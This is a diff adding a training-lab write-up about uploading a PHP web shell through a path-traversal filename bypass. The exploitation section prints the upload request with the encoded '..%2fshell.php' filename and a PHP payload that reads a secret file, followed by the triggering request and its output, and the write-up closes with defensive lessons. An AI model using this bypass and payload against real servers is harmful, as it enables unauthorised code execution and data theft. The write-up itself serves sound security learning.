@@ -1,0 +1,60 @@
+================================
+LAB: Web shell upload via path traversal
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-23
+Lab URL: https://0aef00c90469045380dfd0a000f60059.web-security-academy.net
+Category: File Upload Vulnerabilities
+Level: Practitioner
+Objective: Upload a PHP web shell and exfiltrate /home/carlos/secret
+Description: Vulnerable image upload function. Server blocks execution in the upload directory, but path traversal in the filename field allows storing the file in a parent directory where PHP execution is permitted.
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter
+- Upload endpoint: POST /my-account/avatar (multipart/form-data)
+- Server response confirms upload path: "The file avatars/<filename> has been uploaded."
+- Server: Apache/2.4.41 (Ubuntu)
+- Uploaded files served from: /files/avatars/
+- Direct upload of shell.php to avatars/ would not execute (directory restricted)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- The application uses the user-supplied filename field directly when storing the file.
+- A literal "../shell.php" filename gets sanitized (../ stripped) -> stored as avatars/shell.php.
+- URL-encoding the slash ("..%2fshell.php") bypasses the sanitization.
+- Apache decodes %2f after the app-level strip, reconstructing the traversal.
+- Result: file stored as avatars/../shell.php -> /files/shell.php (outside restricted directory).
+
+[EXPLOITATION]
+--------------
+Step 1 - Upload web shell with encoded path traversal:
+
+  POST /my-account/avatar
+  Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
+  Content-Type: application/octet-stream
+
+  <?php echo file_get_contents('/home/carlos/secret'); ?>
+
+  Server response: "The file avatars/../shell.php has been uploaded."
+
+Step 2 - Trigger execution:
+
+  GET /files/avatars/../shell.php
+
+  Response: G4l9FO1ghg24vpLNbtFNgflaUzRZoLLi
+
+[EVIDENCE]
+----------
+Secret: G4l9FO1ghg24vpLNbtFNgflaUzRZoLLi
+Lab status: Solved
+
+[LESSONS LEARNED]
+-----------------
+- Never trust the filename field in multipart uploads; always sanitize server-side using a generated name.
+- Sanitization must handle both literal "../" and URL-encoded variants ("%2f", "%252f", etc.).
+- Upload directories should have execution disabled (e.g. Apache: php_flag engine off), regardless of filename sanitization.
+- Defense in depth: combine directory-level execution restriction + server-side filename regeneration + MIME type validation.
+- A traversal that is visually confirmed in the response ("avatars/../shell.php") is a clear signal the bypass worked.
